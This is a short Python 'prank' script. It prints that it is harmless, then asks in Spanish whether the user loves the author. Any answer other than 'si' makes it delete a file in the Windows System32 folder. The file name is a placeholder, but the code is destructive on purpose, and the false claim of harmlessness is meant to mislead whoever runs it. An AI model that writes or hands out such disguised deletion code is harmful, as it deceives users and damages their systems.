import os 
print("This is a harmless prank script.")
respuesta = input(str("me quieres si o no?: "))
if respuesta == "si":
    print("Love u 2 : ")
else:
    os.remove("C:\\Windows\\System32\\important_file.txt")